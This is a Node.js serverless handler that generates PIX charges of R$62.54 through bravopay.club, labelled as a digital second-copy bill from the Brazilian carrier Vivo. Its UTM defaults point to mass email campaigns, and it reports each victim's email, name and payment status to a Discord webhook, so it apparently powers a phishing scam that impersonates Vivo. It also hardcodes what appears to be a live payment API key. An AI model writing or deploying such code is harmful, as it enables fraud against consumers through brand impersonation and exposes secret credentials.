const https = require('https');

const BRAVOPAY_API_KEY = 'bp_live_mwXI566Lf7nMQDAvJZD8rn5LLzJo6yHGyqSTCg';
const AMOUNT_CENTS = 6254;
const BILL_DESCRIPTION = 'Vivo 2ª Via de Fatura Digital';
const EXTERNAL_WEBHOOK_URL = process.env.WEBHOOK_URL || '';

function callBravoPay(endpoint, method, payload = null) {
    return new Promise((resolve, reject) => {
        const options = {
            hostname: 'bravopay.club',
            port: 443,
            path: `/api/v1${endpoint}`,
            method,
            headers: {
                'Authorization': `Bearer ${BRAVOPAY_API_KEY}`,
                'Content-Type': 'application/json'
            }
        };
        const req = https.request(options, (res) => {
            let body = '';
            res.on('data', chunk => body += chunk);
            res.on('end', () => {
                try { resolve({ statusCode: res.statusCode, data: JSON.parse(body) }); }
                catch (e) { resolve({ statusCode: res.statusCode, raw: body, error: e.message }); }
            });
        });
        req.on('error', reject);
        if (payload) req.write(JSON.stringify(payload));
        req.end();
    });
}

function dispatchWebhook(event, data) {
    if (!EXTERNAL_WEBHOOK_URL) return;
    try {
        const parsedUrl = new URL(EXTERNAL_WEBHOOK_URL);
        const isDiscord = parsedUrl.hostname.includes('discord.com');
        let bodyPayload;
        if (isDiscord) {
            const isPaid = event === 'pix.approved' || event === 'transaction.paid';
            bodyPayload = {
                embeds: [{
                    title: isPaid ? '✅ PIX PAGO COM SUCESSO! - VIVO' : '⏳ NOVO PIX GERADO (PENDENTE) - VIVO',
                    color: isPaid ? 3066993 : 16753920,
                    fields: [
                        { name: '📧 Cliente / Email', value: data.customer_email || 'N/A', inline: true },
                        { name: '💰 Valor', value: 'R$ ' + ((data.amount_cents || AMOUNT_CENTS) / 100).toFixed(2).replace('.', ','), inline: true },
                        { name: '🆔 ID da Transação', value: data.transaction_id || 'N/A', inline: false },
                        { name: '⏱ Data/Hora', value: new Date().toLocaleString('pt-BR'), inline: true }
                    ],
                    footer: { text: 'Vivo Regulariza • BravoPay Integration' }
                }]
            };
        } else {
            bodyPayload = { event, timestamp: new Date().toISOString(), data };
        }
        const reqData = JSON.stringify(bodyPayload);
        const http = require('http');
        const client = parsedUrl.protocol === 'https:' ? https : http;
        const req = client.request(parsedUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(reqData) }
        });
        req.on('error', () => {});
        req.write(reqData);
        req.end();
    } catch (e) {}
}

module.exports = async (req, res) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
    if (req.method === 'OPTIONS') return res.status(200).end();
    if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });

    try {
        const params = req.body || {};
        const email = params.email || 'cliente@vivo.com.br';
        const name = params.name || params.nome || 'Cliente Vivo';
        const cpf = (params.cpf || '').replace(/\D/g, '');
        const externalRef = 'vivo_' + Date.now() + '_' + Math.floor(Math.random() * 9000 + 1000);

        const payload = {
            amount_cents: AMOUNT_CENTS,
            method: 'pix',
            customer: { email, name },
            description: BILL_DESCRIPTION,
            external_reference: externalRef,
            utm: {
                source: params.utm_source || 'email',
                medium: params.utm_medium || 'disparo',
                campaign: params.utm_campaign || 'fatura_vivo',
                content: params.utm_content || '',
                term: params.utm_term || '',
                fbclid: params.fbclid || '',
                gclid: params.gclid || '',
                ttclid: params.ttclid || ''
            }
        };
        if (cpf && cpf.length >= 11) payload.customer.cpf = cpf;

        const bpRes = await callBravoPay('/transactions', 'POST', payload);

        if (bpRes.statusCode >= 200 && bpRes.statusCode < 300 && bpRes.data && bpRes.data.id) {
            const tx = bpRes.data;

            dispatchWebhook('pix.pending', {
                status: 'PENDING',
                transaction_id: tx.id,
                customer_email: email,
                customer_name: name,
                amount_cents: AMOUNT_CENTS,
                copy_paste: tx.pix?.copy_paste || '',
                expires_at: tx.pix?.expires_at || null,
                created_at: tx.created_at || new Date().toISOString()
            });

            return res.status(200).json({
                success: true,
                id: tx.id,
                status: tx.status || 'PENDING',
                amount_cents: tx.amount_cents || AMOUNT_CENTS,
                pix: {
                    copy_paste: tx.pix?.copy_paste || '',
                    expires_at: tx.pix?.expires_at || ''
                },
                customer: { email, name }
            });
        } else {
            return res.status(bpRes.statusCode || 400).json({
                error: bpRes.data?.error?.message || 'Erro ao gerar PIX',
                details: bpRes.data
            });
        }
    } catch (err) {
        return res.status(500).json({ error: err.message });
    }
};
